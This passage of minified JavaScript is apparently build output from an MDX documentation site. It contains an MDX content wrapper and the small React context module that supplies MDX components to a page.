d(e={}){const{wrapper:n}={...(0,c.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(h,{...e})}):h(e)}},8453:(e,n,t)=>{t.d(n,{R:()=>s,x:()=>l});var i=t(6540);const a={},c=i.createContext(a);function s(e){const n=i.useContext(c);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:s(e.components),i.createElement(c.Provider,{value:n},e.children)}}}]);